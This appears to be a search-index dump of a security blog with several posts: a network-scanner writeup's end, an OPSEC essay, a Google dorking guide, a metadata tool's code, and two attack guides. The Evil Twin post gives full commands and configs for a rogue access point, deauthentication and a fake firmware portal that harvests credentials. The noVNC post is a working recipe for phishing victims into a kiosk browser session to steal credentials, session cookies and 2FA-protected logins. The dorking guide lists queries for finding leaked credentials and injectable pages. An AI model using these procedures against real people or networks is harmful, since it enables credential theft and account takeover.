for potential vulnerabilities.  query_exploit_db: Queries Exploit-DB for potential exploits.  vulnerability_scan: Performs a vulnerability scan using external APIs.  traceroute: Performs a traceroute to the target IP.  geolocation: Determines the geographical location of the target IP.  whois_lookup: Performs a WHOIS lookup for the target domain or IP.  ssl_tls_check: Checks SSL/TLS configurations for HTTPS services.  start_scan: Orchestrates the entire scanning process.InterfaceCommand-Line InterfaceHTML Report Template InterfaceLimitations  Rate Limiting: The program may be rate-limited by external APIs like Shodan, NVD, and CIRCL.  Accuracy: OS fingerprinting and service detection may not always be accurate.  GeoIP Database: The program requires a local GeoIP database for geolocation. If the database is not present, geolocation will not work.  SSL/TLS Check: The SSL/TLS check is limited to port 443 (HTTPS).  Vulnerability Scanning: The vulnerability scanning feature relies on external APIs and may not cover all possible vulnerabilities.Future Enhancements  Support for IPv6: Add support for scanning IPv6 addresses.  Enhanced OS Fingerprinting: Improve the accuracy of OS fingerprinting by incorporating more advanced techniques.  Integration with More APIs: Integrate with additional vulnerability databases and APIs.  User Interface: Develop a graphical user interface (GUI) for easier interaction.  Automated Reporting: Add support for automated email or Slack notifications with the scan report.  Customizable Port Ranges: Allow users to define and save custom port ranges for scanning.  Performance Optimization: Optimize the code for faster scanning and reduced resource usage.Ethical Considerations  Authorization: Always ensure you have proper authorization before scanning any network or system. Unauthorized scanning can be illegal and unethical.  Data Privacy: Be mindful of the data you collect during scanning. Ensure that any sensitive information is handled securely and in compliance with relevant laws and regulations.  Impact on Target Systems: Be aware that aggressive scanning can impact the performance of target systems. Use the tool responsibly and avoid causing disruption.  Disclosure of Vulnerabilities: If you discover vulnerabilities during your scan, follow responsible disclosure practices to inform the affected parties.Tips and Tricks  Use Top Ports: For a quick scan, use the “Top Ports” option to scan commonly used ports.  Custom Port Ranges: For a more thorough scan, specify a custom port range (e.g., 1-1024).  GeoIP Database: Ensure the GeoIP database is present in the working directory for accurate geolocation.  External APIs: If you have API keys for Shodan or other services, configure them in the code for enhanced vulnerability scanning.  HTML Report: Always review the generated HTML report for a comprehensive summary of the scan results.Extra Insights  Service Banners: The program attempts to grab service banners from open ports. This can provide valuable information about the services running on the target.  Vulnerability Suggestions: The program suggests potential vulnerabilities based on the detected services. Use this information to prioritize further investigation.  Traceroute: The traceroute feature can help you understand the network path to the target, which can be useful for troubleshooting or network analysis.  WHOIS Lookup: The WHOIS lookup feature provides information about the domain registration, which can be useful for identifying the owner of the target.ConclusionThis Python-based network scanner is a tool for network reconnaissance and vulnerability assessment. It provides a wide range of features, from basic port scanning to advanced vulnerability detection and reporting."
  },
  
  {
    "title": "OPSEC",
    "url": "/posts/opsec/",
    "categories": "OPSEC, Anonymity",
    "tags": "Anonymity, Privacy",
    "date": "2025-02-04 11:53:00 +0000",
    





    
    "snippet": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OP...",
    "content": "A Tactical Dive into Operations SecurityFinally taking the plunge to share thoughts that have been brewing in the recesses of my mind. So, what’s the scoop? It’s all about the intricate dance of OPSEC, or OPERATIONS SECURITY. For those who fancy a formal definition, OPSEC is the art of evaluating whether our moves are visible to potential threats, assessing the risk of compromising information, and then taking calculated measures to thwart those who seek to exploit our critical data.The Origins of OPSECDiving into the tactical realm, OPSEC emerged officially in 1966 during the US’s Operation Purple Dragon, spurred by the need to investigate operational mishaps and devise a pre-operation process to dodge fatal compromises.Core PrinciplesIn a nutshell, OPSEC boils down to one thing: control. Control over information and actions, to prevent any attempts at turning them against you. Whether you’re immersed in threat intelligence collection, a red team engagement, or just nosing around an investigation, OPSEC is the guardian angel watching over it all. While the textbooks swear by five sacred steps, we’re zooming in on a couple, starting with the core of Identifying and Analyzing Threats &amp; Vulnerabilities.Picture a process that unveils the adversary’s watchful gaze, details the information they crave, and pinpoints your Achilles’ heels. That’s just the kickoff. We then pivot to Assessing Risks and strategically applying Appropriate Countermeasures. Quick heads-up: I’m spinning this yarn with a big ol’ focus on Anonymity and Privacy.Safeguarding Critical InformationNow, whether you’re a soldier, a civilian, or somewhere in the murky in-between, safeguarding your critical information is non-negotiable. This isn’t just a 9-to-5 deal—it extends to your home. OPSEC isn’t just for the field; it’s your shield against personal info leaks and safeguarding sensitive details from turning into weapons against you. From PII and financial data to your daily grind, address, and personal records, OPSEC’s got your back.Stick around, and we’ll navigate the cyber, hopping between topics, unraveling my train of thought. By the time we wrap this up, it should all click into place.Identifying and Analyzing Threats &amp; VulnerabilitiesAlright, let’s demystify the Identification of Critical Information. In plain speak, it’s about pinpointing what needs safeguarding to pull off the operation without a hitch. Be it your source IP address, the tools of the trade, or the intricate web of your command and control (C&amp;C) infrastructure – make it crystal clear. Enter CALI (Capabilities, Activities, Limitations, and Intentions), a straightforward checklist outlining the operation’s must-haves. But before I dive into the deep end and potentially befuddle you, let’s ease into it with a high-level overview and a dash of shenanigans.Internet Privacy: IP AddressLet’s get down to the internet. IP – the gateway to the online realm. Your connection to the internet is marked by an IP provided by your trusty ISP (Internet Service Provider), a key linked to an entry in their database. Most countries, ever-vigilant, have data retention regulations, forcing ISPs to log who’s using what IP when, for years on end. If that origin IP leaks, it’s a breadcrumb trail straight to you.DNS (Domain Name System)Now, DNS. Standing for “Domain Name System,” it’s the wizard behind the curtain, helping your browser find the IP address of a service. Think of it as a colossal contact list – ask for a name, and it hands you the number. When your browser wants to visit, say, github via github.com, it ping-pongs with a DNS service to unveil the IP addresses of github’s servers.Typically, your ISP dishes out the DNS service, automatically set up by the network you’re on. So, you type github.com into your browser, and the request embarks on an internet journey, hopping from DNS resolver to root nameserver to TLD server, and finally, to the domain’s nameserver. All this dance reveals the IP address of github.com, which then travels back to your browser, completing the ritual.For a deeper dive, check out: What is DNS?But here’s the kicker – most of these DNS requests cruise unencrypted. Even if you’re surfing in incognito mode or HTTPS, your browser might be casually throwing unencrypted DNS requests out there, saying, “Hey, what’s the IP address of www.cloudflare.com”. Not exactly covert, right?Fortifying Your Privacy with Encrypted DNSNow that we’ve paved the way and you’ve got the basics down, let’s talk about fortifying your privacy. Enter encrypted DNS (DNS over HTTPS or DNS over TLS). You can set up your private DNS server, self-hosted with something like pi-hole or remotely hosted with services like nextdns or 1.1.1.1 within the Tor network. Sounds like airtight privacy, right? Well, not entirely.You can’t don the cloak of Tor all the time – it’s like shouting, “Hey, look at me!” and that’s not our game plan. To dodge unnecessary attention, we introduce VPNs and Tor, tag-teaming to keep your ISP and any nosy third party from eavesdropping or blocking your DNS requests. We’ll unpack this intricate dance in more detail down the road.MAC Address Randomization &amp; TrackingWe’ve got a glaring gap to address here – MAC addresses, a pivotal piece of the puzzle. Your MAC address, acting as a unique ID for your network interface, can become a tracking beacon if left unrandomized. Big players like Microsoft and Apple, along with device manufacturers, maintain logs with MAC addresses, creating a traceable trail linking devices to specific accounts.Even if you think you’ve slipped under the radar by buying your gadget “anonymously,” surveillance tactics, from CCTV footage to mobile provider antenna logs, might expose your identity. So, randomizing your MAC becomes a non-negotiable move. Concealing both your MAC and Bluetooth addresses is paramount.Threat Analysis: Understanding Your AdversaryNow, let’s unpack Threat Analysis in layman’s terms. It’s all about getting to know your adversaries inside out and identifying what’s on the line. Picture this: the threat of your source IP, network, or fingerprint being exposed. This becomes especially critical when dealing with malware samples – slip up, and your investigation might be blown.For those donning the hat of adversary hunters, safeguarding your identity as a researcher is paramount. Some adversaries aren’t above trying to infect or exploit researchers with malware. Let’s break it down step by step:  Main OS: Used for normal work, research, browsing, and keeping things clean.  Private VM: For malware analysis, encrypted traffic routing.  Hidden OS: A VM within a VM, routed through Tor for complete anonymity.This multi-layered approach significantly slashes the odds of your adversaries easily de-anonymizing you.Whonix: A Linchpin for AnonymizationEnter Whonix, a linchpin in the anonymization process. Whonix, a Linux distribution, rolls out two Virtual Machines:  Whonix Workstation: Your go-to for anonymous activities.  Whonix Gateway: Establishing a connection to the Tor network and routing all network traffic from the Workstation through the Tor network.You’ve got two routes here:  Whonix-only route, where all traffic journeys through the Tor Network.  Whonix hybrid route, where everything goes through a cash-paid VPN over the Tor Network.Choose your adventure wisely.Vulnerability Analysis &amp; Risk AssessmentNow, let’s delve into identifying vulnerabilities – the weak spots adversaries are itching to exploit. The Tor Project, while a formidable force, isn’t an impervious fortress against global adversaries. Successful attacks have left their mark, and advanced techniques boasting a remarkable 96% success rate in fingerprinting encrypted traffic have emerged over the years, exposing the websites you’ve visited.Consider major platforms like Twitter and Facebook. The anonymity offered by Tor starts losing its mojo when users toss in their real names, pictures, and link their accounts to personal info like emails and phone numbers. Platforms can employ algorithms to scrutinize browsing patterns, potentially connecting you to other profiles.Securing DevicesDon’t forget to disable Bluetooth, biometrics, webcam, and microphone. Enable BIOS/UEFI password, and disable USB/HDMI. These measures help keep things in check and fend off certain attacks. And whatever you do, don’t leave your laptop unattended in your hotel room or elsewhere. Make it as challenging as possible for anyone to tamper with it without raising alarms.Conclusion: OPSEC as a StrategyI won’t sugarcoat it – achieving perfect OPSEC is an illusion. Compromises are inevitable. The key is in your dedication and the measures you’re willing to take. The more time invested and the more cautious you are, the better.Remember the basics: avoid attracting attention, stay vigilant, be patient, steer clear of laziness and ignorance, blend in, do what makes sense, and, most importantly, Sh*t up.Final ThoughtsI’ve touched on the shenanigans in play. While not an exhaustive dive into every facet of attacks or vulnerabilities, consider this a 101 to kickstart your research. It’s designed to stake a claim in the recesses of your mind, offering a glimpse into how an OPSEC strategy should take shape.And no matter what research you conduct or guide/tips you come across might not cut it; they could be downright irrelevant to your unique operations.So, how do you make this realistically work? Simple. Build your own OPSEC and execute drills that fit your OP. It shouldn’t consume more than a few hours in most cases. Stay sharp, stay secure."
  },
  
  {
    "title": "Evil Twin Attack",
    "url": "/posts/Evil-Twin-Attack/",
    "categories": "Exploits, Evil Twin Attack",
    "tags": "Exploits, Evil Twin Attack",
    "date": "2025-02-01 13:40:00 +0000",
    





    
    "snippet": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) th...",
    "content": "Evil Twin Attack: Exploiting Wi-Fi Clients Without Additional HardwareIntroductionThe Evil Twin Attack is a sophisticated method of exploiting Wi-Fi clients by creating a rogue access point (AP) that mimics a legitimate one. The goal is to force clients to disconnect from the legitimate network and reconnect to the malicious AP, which has the same SSID. Once connected, the attacker can intercept traffic, redirect users to a fake firmware upgrade page, and harvest credentials or other sensitive information.This attack can be executed using a Debian-based OS like Kali Linux without the need for additional hardware (though an external NIC may improve performance). Below is a step-by-step guide to setting up the attack, followed by mitigation strategies to defend against such exploits.Attack Overview  Objective:          Knock Wi-Fi clients off their legitimate network.      Force them to reconnect to a rogue AP with the same SSID.      Redirect traffic to a fake firmware upgrade portal to harvest credentials.        Tools:          hostapd: For creating the rogue AP.      dnsmasq: For DHCP and DNS spoofing.      apache2/nginx: For hosting the fake portal.      iptables: For traffic redirection.      aireplay-ng: For deauthentication attacks.        Prerequisites:          A wireless interface in monitor mode.      Basic knowledge of networking, social engineering, and web development.      Step-by-Step Execution1. Install Required Toolssudo apt install hostapd dnsmasq apache22. Set Wireless Interface to Monitor Modeiwconfig [iface] mode monitor3. Create Working Directorymkdir evil-twin &amp;&amp; cd evil-twin4. Configure hostapdCreate hostapd.conf:vim hostapd.confConfiguration:interface = [iface]driver = nl80211ssid = [ESSID of target]hw_mode = gchannel = [channel of target]macaddr_acl = 0ignore_broadcast_ssid = 05. Configure dnsmasqCreate dnsmasq.conf:vim dnsmasq.confConfiguration:interface = [iface]dhcp-range = 192.168.1.2, 192.168.1.30, 255.255.255.0, 12hdhcp-option=3, 192.168.1.1dhcp-option=6, 192.168.1.1server = 8.8.8.8log-querieslog-dhcplisten-address=127.0.0.16. Configure Network Interfaceifconfig [iface] up 192.168.1.1 netmask 255.255.255.07. Add Routing Rulesroute add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.18. Set Up IP Tables for Traffic Redirectioniptables --table nat --append PREROUTING -i [iface] -p tcp -j REDIRECT --to-ports &lt;ports running your portal&gt;9. Set Up the Fake Portal  Use tools like httrack to clone a legitimate firmware upgrade page.  Modify the HTML/CSS to make it convincing.  Set up a backend (e.g., Flask, Node.js) to handle user input.  Save credentials to a database or file.10. Start Serviceshostapd hostapd.confdnsmasq -C dnsmasq.conf -ddnsspoof -i [iface]11. Launch Deauthentication Attackaireplay-ng --deauth 0 -a [victim's BSSID] [iface]Mitigation Strategies1. Use Strong Encryption  Ensure your Wi-Fi network uses WPA3 encryption. If WPA3 is unavailable, use WPA2 with a strong passphrase.2. Monitor for Rogue APs  Deploy wireless intrusion detection systems (WIDS) to detect and alert on rogue APs.3. Implement Certificate-Based Authentication  Use 802.1X/EAP to authenticate devices connecting to your network. This prevents unauthorized devices from joining, even if they have the correct SSID and password.4. Educate Users  Train users to recognize suspicious activity, such as unexpected firmware upgrade prompts or certificate warnings.5. Disable Auto-Reconnect  Configure devices to not auto-reconnect to known networks without user confirmation.6. Regularly Update Firmware  Ensure all network devices are running the latest firmware to patch known vulnerabilities.7. Segment Your Network  Use VLANs to isolate sensitive devices and services from the rest of the network.8. Monitor Network Traffic  Use tools like Wireshark or Zeek to analyze network traffic for anomalies.9. Enable HTTPS Everywhere  Ensure all web-based services use HTTPS to prevent traffic interception.10. Deploy Honeypots  Set up honeypot APs to detect and analyze malicious activity."
  },
  
  {
    "title": "Exploiting noVNC for 2FA Bypass",
    "url": "/posts/Exploiting-noVNC-for-2FA-Bypass/",
    "categories": "Exploits, noVNC",
    "tags": "Exploits, noVNC, 2FA Bypass",
    "date": "2025-01-29 00:00:00 +0000",
    





    
    "snippet": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, inclu...",
    "content": "Using noVNC for Credential Acquisition and Bypassing 2FAnoVNC is both a JavaScript library for VNC clients and an application built on top of this library. Compatible with any modern browser, including mobile versions for iOS and Android, noVNC allows the web browser to function as a VNC client, enabling remote access to a machine.So, how can we use noVNC to acquire credentials and bypass 2FA? Here’s the process:  Set up a server with noVNC.  Start Chromium (or any other browser) in Kiosk mode.  Direct it to the desired website for user authentication (e.g., accounts.google.com).  Send the link to the target user. When they click the URL, they will access the VNC session without realizing it.  Since Chromium is configured in Kiosk mode, the user experience will appear as a normal web page.Exploitation PossibilitiesThe exploitation possibilities of this method are vast:  Inject JS into the browser.  Use an HTTP proxy connected to the browser to log all activities.  Terminate the VNC session after user authentication.  Capture the browser session token (Right-click &gt; Inspect &gt; Application &gt; Cookies) after the user disconnects.  Run a background keylogger.  Or get creative and find other approaches (remember, the server is yours).noVNC Setup and Demonstration1. Deploy a Kali Linux InstanceUse any cloud service provider or deploy locally to set up a Linux machine. I will use Kali Linux for this demonstration because I prefer it, but you can choose any other Linux distribution you are comfortable with.2. Install TigerVNCFirst, you need to install VNC software. I tested two options: X11vnc and TigerVNC. After several tests, I chose to use TigerVNC.sudo apt updatesudo apt install tigervnc-standalone-server tigervnc-xorg-extension tigervnc-viewer3. Set Up a VNC PasswordvncpasswdOn Kali Linux, I didn’t need to create the xstartup file, but if you encounter any errors, you can configure it manually.nano ~/.vnc/xstartupPaste or write the following:#!/bin/shxrdb \"$HOME/.Xresources\"xsetroot -solid greyx-terminal-emulator -geometry 80x24+10+10 -ls -title \"$VNCDESKTOP Desktop\" &amp;x-window-manager &amp;# Fix to make GNOME workexport XKL_XMODMAP_DISABLE=1/etc/X11/XsessionAdd execution permissions:chmod +x ~/.vnc/xstartup4. Restart the VNC ServerRestart the VNC server, choosing the screen size settings according to your needs. noVNC automatically adjusts to the browser’s screen size, but do your own testing.vncserver -depth 32 -geometry 1920x10805. Download and Run noVNCgit clone https://github.com/novnc/noVNC.gitORapt install novncNow run noVNC locally or publicly. Here are the commands:  Check the VNC server port:vncserver -listExample: 5901, 5902, 5903, etc.  Run noVNC:./noVNC/utils/novnc_proxy --vnc localhost:5901  Set up an SSH tunnel:ssh -L 6080:127.0.0.1:6080 root@server  Run publicly using port 8081:ufw allow http./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80816. Access VNC and Run the Browser in Kiosk ModeAccess your VNC and run the browser in Kiosk mode. I used Chromium, but you can use whatever suits your needs.chromium --no-sandbox --app=https://gmail.com --kiosk7. Send the URL to the “Victim” to Connect Automaticallyhttp://127.0.0.1:6080/vnc.html?autoconnect=true&amp;password=YOUR-PASSWORDThe autoconnect=true&amp;password=VNCPASSWORD will make the user authenticate automatically. If you want to rename the query parameter, you can modify the vnc.html file.8. Modify the CSS to Remove Visual ElementsnoVNC displays a custom loading page, a VNC control bar, and some additional unnecessary visual elements that should be removed.Open vnc.html, find the divs below, and add the CSS style shown.&lt;!-- Hide unnecessary items --&gt;&lt;div id=\"noVNC_control_bar_anchor\" class=\"noVNC_vcenter\" style=\"display:none;\"&gt;&lt;div id=\"noVNC_status\" style=\"display:none\"&gt;&lt;/div&gt;&lt;!-- Makes the loading page white --&gt;&lt;div id=\"noVNC_transition\" style=\"background-color:white;color:white\"&gt;Important Notes  You are giving remote access to your machine! It should not have anything valuable stored on it.  Any logged data should likely be sent to a remote machine.  Do not use the root account. Set up a restricted user account that uses the VNC service.  Configure the Kiosk mode more restrictively."
  },
  
  {
    "title": "Mastering Google Dorking: The Ultimate Guide",
    "url": "/master-google-dorking-ultimate-guide",
    "categories": "OSINT, Google Dorking",
    "tags": "Google Dorking, Advanced Search",
    "date": "2025-01-28 00:00:00 +0000",
    





    
    "snippet": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything ...",
    "content": "Mastering Google Dorking: The Ultimate GuideGoogle Dorking, also known as Google Hacking, is a technique used to uncover sensitive information exposed on the internet. This guide covers everything from the basics to advanced techniques, including automation, OSINT gathering, vulnerability exploitation, and ethical considerations. Whether you’re a beginner or an experienced cybersecurity professional, this guide will help you master Google Dorking.Table of Contents  Introduction to Google Dorking  Fundamentals of Google Dorking  Understanding Google Dork Operators  Common Google Dork Queries  Advanced Techniques          Advanced Query Crafting      Exploiting Specific Vulnerabilities      Using Google Dorking for OSINT      Automation and Scripting        Case Studies  Preventing Google Dorking  Google Dorking Tools and Resources  Legal Considerations  ConclusionIntroduction to Google DorkingGoogle Dorking is a technique used to find sensitive information accidentally exposed on the internet. This can include:  Log files with usernames and passwords  Exposed cameras and IoT devices  Sensitive documents (e.g., financial records, confidential files)  Website vulnerabilities (e.g., SQL injection points)While Google Dorking is a powerful tool for information gathering, it is often misused for malicious purposes such as cyberattacks, identity theft, and digital espionage. This guide emphasizes ethical use and encourages readers to use these techniques for security testing and vulnerability assessment.Fundamentals of Google DorkingGoogle Dorking relies on advanced search operators to refine search results. These operators allow you to target specific types of information. Below are the seven fundamental types of queries used in Google Dorking:  intitle: Searches for pages with specific text in their HTML title.          Example: intitle:\"login page\"        allintitle: Similar to intitle, but requires all keywords to be in the title.          Example: allintitle:\"login page admin\"        inurl: Searches for pages based on text in the URL.          Example: inurl:login.php        allinurl: Similar to inurl, but requires all keywords to be in the URL.          Example: allinurl:admin login        filetype: Filters results by specific file types.          Example: filetype:pdf        ext: Filters results by file extensions.          Example: ext:log        site: Limits search results to a specific website.          Example: site:example.com      Understanding Google Dork OperatorsGoogle Dork operators are the building blocks of effective queries. Here’s a breakdown of the most commonly used operators:            Operator      Description      Example                  intitle      Searches for pages with specific text in the title.      intitle:\"login page\"              allintitle      Searches for pages with all specified keywords in the title.      allintitle:\"admin login\"              inurl      Searches for pages with specific text in the URL.      inurl:admin              allinurl      Searches for pages with all specified keywords in the URL.      allinurl:admin login              filetype      Filters results by specific file types.      filetype:pdf              ext      Filters results by file extensions.      ext:log              intext      Searches for pages containing specific text in the body.      intext:\"username\"              allintext      Searches for pages containing all specified keywords in the body.      allintext:\"username password\"              site      Limits search results to a specific domain.      site:example.com              cache      Displays the cached version of a page.      cache:example.com      Common Google Dork QueriesBelow are some commonly used Google Dork queries for various purposes:General Dorksintitle:\"Index of\"intitle:\"Index of\" site:example.comfiletype:log inurl:\"access.log\"intext:\"Welcome to phpMyAdmin\"intitle:\"Login — WordPress\"intext:\"Powered by WordPress\"Database-Related Dorksinurl:/phpmyadmin/index.phpinurl:/db/websql/inurl:/phpPgAdmin/index.phpintext:\"phpPgAdmin — Login\"Search for Vulnerabilitiesintext:\"Error Message\" intext:\"MySQL server\" intext:\"on * using password:\"intext:\"Warning: mysql_connect()\" intext:\"on line\" filetype:phpExposed Documents and Filesfiletype:pdf intitle:\"Confidential\"filetype:doc intitle:\"Confidential\"filetype:xls intitle:\"Confidential\"filetype:ppt intitle:\"Confidential\"Directory Listingsintitle:\"Index of\" inurl:/parent-directoryintitle:\"Index of\" inurl:/admin*intitle:\"Index of\" inurl:/backupintitle:\"Index of\" inurl:/configintitle:\"Index of\" inurl:/logsExposed Webcams and Camerasinurl:\"view/index.shtml\"intitle:\"Live View /-AXIS\"intitle:\"Network Camera NetworkCamera\"Authentication-Related Dorksintitle:\"Login\" inurl:/adminintitle:\"Login\" inurl:/logininurl:\"/admin/login.php\"Exposed Control Panelsintitle:\"Control Panel\" inurl:/adminintitle:\"Control Panel\" inurl:/cpanelExposed IoT Devicesintitle:\"Smart TV\" inurl:/cgi-bin/loginintitle:\"Router Login\" inurl:/loginFinding PHP Info Pagesintitle:\"PHP Version\" intext:\"PHP Version\"Exposing Sensitive Files on Government Sitessite:gov (inurl:doc | inurl:pdf | inurl:xls | inurl:ppt | inurl:rtf | inurl:ps)Exposed Network Devicesintitle:\"Brother\" intext:\"View Configuration\"intitle:\"Network Print Server\" filetype:htmlintitle:\"HP LaserJet\" inurl:SSI/index.htmFile Upload Vulnerabilitiesinurl:/uploadfile/ filetype:phpintext:\"File Upload\" inurl:/php/Advanced TechniquesAdvanced Query CraftingCombine multiple operators for precise searches. Use parentheses () to group conditions and logical operators (OR, AND, -) to refine results.Example:site:example.com (intitle:\"login\" OR inurl:\"admin\") filetype:phpExploiting Specific Vulnerabilities  SQL Injection: inurl:index.php?id=  XSS Vulnerabilities: inurl:search.php?q=  File Inclusion Vulnerabilities: inurl:index.php?page=Using Google Dorking for OSINT  Gathering Information: site:linkedin.com intitle:\"John Doe\"  Finding Leaked Credentials: filetype:txt \"username\" \"password\"Automation and ScriptingAutomate Google Dorking using Python and the requests library.Example Script:import requestsdef google_dork(query):    url = f\"https://www.google.com/search?q={query}\"    headers = {\"User-Agent\": \"Mozilla/5.0\"}    response = requests.get(url, headers=headers)    return response.textquery = 'inurl:index.php?id='results = google_dork(query)print(results)Case StudiesReal-World Example 1: Finding Exposed Admin PanelsA penetration tester used the following query to find exposed admin panels:intitle:\"Admin Login\" inurl:/adminReal-World Example 2: Exploiting SQL InjectionA bug bounty hunter used the following query to find SQL injection vulnerabilities:inurl:index.php?id=Preventing Google DorkingTo protect your website from Google Dorking:  IP-based Restrictions: Limit access to sensitive areas.  Vulnerability Scans: Regularly scan for vulnerabilities.  Google Search Console: Remove sensitive content from search results.  robots.txt: Use this file to block search engines from indexing sensitive directories.  Secure Passwords: Change default passwords on devices and systems.  Disable Remote Logins: Prevent unauthorized access to network devices.Google Dorking Tools and ResourcesHere are some tools and resources to help you get started:  DorkSearch: https://dorksearch.com  Dorks Builder: https://dorks.faisalahmed.me  Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database  Google Operators Guide: https://support.google.com/vault/answer/2474474Legal ConsiderationsUnderstanding Legal BoundariesGoogle Dorking can be a legal gray area. Ensure you have explicit permission before testing any website. Unauthorized access to systems is illegal and punishable by law.ConclusionGoogle Dorking is an invaluable skill for cybersecurity professionals, but it must be used responsibly. By mastering advanced techniques, automating queries, and understanding legal boundaries, you can leverage Google Dorking to enhance security and uncover vulnerabilities. Always prioritize ethical use and obtain proper authorization before performing any tests."
  },
  
  {
    "title": "Metadata Finder",
    "url": "/posts/python-metadata-finder",
    "categories": "Python, Metadata Finder",
    "tags": "Python, Metadata Finder",
    "date": "2025-01-26 00:00:00 +0000",
    





    
    "snippet": "A comprehensive tool for finding, managing, and removing metadata from images.Features  Metadata Extraction: Extracts detailed metadata such as EXIF data, GPS coordinates, file size, checksum, and ...",
    "content": "A comprehensive tool for finding, managing, and removing metadata from images.Features  Metadata Extraction: Extracts detailed metadata such as EXIF data, GPS coordinates, file size, checksum, and more.  Image Preview: Displays a preview of the uploaded image.  Metadata Removal: Removes all metadata from the image and saves it as a new file.  Metadata Saving: Saves extracted metadata in either .txt or .json format.  User-Friendly GUI: Built with a dark theme for an intuitive user experience.  Progress Indicator: Provides real-time feedback during metadata extraction and removal processes.How It Works  Upload an Image: Use the “Upload Image” button to select an image file (supported formats: JPG, JPEG, PNG, GIF, BMP).  Check Metadata: Click the “Check Metadata” button to extract and display the metadata of the uploaded image.  Remove Metadata: Click the “Remove Metadata” button to strip all metadata from the image and save it as a new file.  Save Metadata: Save the extracted metadata to a file using the “Save Metadata” button.Full CodeGithub Repository:  Metadata Finderimport osimport jsonimport exifreadimport hashlib  # For checksum calculationimport tkinter as tkfrom tkinter import filedialog, messagebox, scrolledtext, ttkfrom PIL import Image, ImageTkclass MetaDataFinderGUI:    def __init__(self, root):        self.root = root        self.root.title(\"Metadata Finder - Professional Tool\")        self.root.geometry(\"1000x800\")        self.root.minsize(1000, 800)        # Initialize variables        self.image_path = None        self.metadata = {}        self.theme = \"dark\"  # Fixed to dark theme        # Set initial theme        self.set_theme()        # Create UI Elements        self.create_ui()    def set_theme(self):        if self.theme == \"dark\":            self.bg_color = \"#333333\"            self.fg_color = \"#FFFFFF\"            self.button_bg = \"#555555\"            self.button_fg = \"#FFFFFF\"            self.text_area_bg = \"#444444\"            self.text_area_fg = \"#FFFFFF\"            self.root.configure(bg=self.bg_color)    def create_ui(self):        # Title Label        title_label = tk.Label(            self.root,            text=\"Metadata Finder\",            font=(\"Arial\", 24, \"bold\"),            bg=self.bg_color,            fg=self.fg_color,            padx=10,            pady=10        )        title_label.pack(fill=\"x\")        # Description Label        desc_label = tk.Label(            self.root,            text=\"A Comprehensive Image Metadata Finder &amp; Manager Tool\",            font=(\"Arial\", 12),            bg=self.bg_color,            fg=self.fg_color        )        desc_label.pack(pady=10)        # File Upload Button        upload_button = tk.Button(            self.root,            text=\"Upload Image\",            command=self.upload_image,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        upload_button.pack(pady=10)        # Image Preview Frame        self.image_preview_frame = tk.Frame(self.root, bg=self.bg_color)        self.image_preview_frame.pack(pady=10)        self.image_label = tk.Label(self.image_preview_frame, bg=self.bg_color)        self.image_label.pack()        # Metadata Display Area        self.metadata_display = scrolledtext.ScrolledText(            self.root,            wrap=tk.WORD,            width=80,            height=15,            font=(\"Arial\", 10),            bg=self.text_area_bg,            fg=self.text_area_fg,            insertbackground=self.fg_color        )        self.metadata_display.pack(pady=10)        self.metadata_display.config(state=\"disabled\")        # Action Buttons Frame        buttons_frame = tk.Frame(self.root, bg=self.bg_color)        buttons_frame.pack(pady=10)        # Check Metadata Button        check_button = tk.Button(            buttons_frame,            text=\"Check Metadata\",            command=self.check_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        check_button.grid(row=0, column=0, padx=10)        # Remove Metadata Button        remove_button = tk.Button(            buttons_frame,            text=\"Remove Metadata\",            command=self.remove_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        remove_button.grid(row=0, column=1, padx=10)        # Save Metadata Button        save_button = tk.Button(            buttons_frame,            text=\"Save Metadata\",            command=self.save_metadata,            font=(\"Arial\", 12),            bg=self.button_bg,            fg=self.button_fg,            padx=10,            pady=5        )        save_button.grid(row=0, column=2, padx=10)        # Progress Bar        self.progress = ttk.Progressbar(self.root, orient=\"horizontal\", length=300, mode=\"indeterminate\")        self.progress.pack(pady=10)    def upload_image(self):        self.image_path = filedialog.askopenfilename(            title=\"Select an Image\",            filetypes=[(\"Image Files\", \"*.jpg *.jpeg *.png *.gif *.bmp\")]        )        if self.image_path:            self.display_image()        else:            messagebox.showwarning(\"Warning\", \"No image selected.\")    def display_image(self):        try:            img = Image.open(self.image_path)            img = img.resize((300, 300), Image.Resampling.LANCZOS)            img_tk = ImageTk.PhotoImage(img)            self.image_label.config(image=img_tk)            self.image_label.image = img_tk        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to load image: {str(e)}\")    def check_metadata(self):        if not self.image_path:            messagebox.showwarning(\"Warning\", \"Please upload an image first.\")            return        try:            self.progress.start()            self.metadata = self.format_metadata(self.image_path)            self.display_metadata()            self.progress.stop()        except Exception as e:            messagebox.showerror(\"Error\", f\"Failed to read metadata: {str(e)}\")            self.progress.stop()    def format_metadata(self, image_path):        metadata = {}        # EXIF Data        try:            with open(image_path, 'rb') as image_file:                tags = exifread.process_file(image_file)                metadata['Date and Time'] = tags.get('EXIF DateTimeOriginal', 'Not Available')                metadata['Camera Model'] = tags.get('Image Model', 'Not Available')                metadata['Device Name'] = tags.get('Image Make', 'Not Available')                metadata['Software'] = tags.get('Image Software', 'Not Available')                metadata['GPS Coordinates'] = self.get_gps_coordinates(tags)        except Exception:            metadata['EXIF Data'] = \"No EXIF data found\"        # Additional Metadata Fields        metadata['Checksum'] = self.calculate_checksum(image_path)        metadata['File Name'] = os.path.basename(image_path)        metadata['File Size'] = os.path.getsize(image_path)        metadata['File Type'] = Image.open(image_path).format        metadata['File Type Extension'] = os.path.splitext(image_path)[1].lower()        metadata['MIME Type'] = Image.MIME[Image.open(image_path).format]        img = Image.open(image_path)        metadata['Image Width'] = img.width        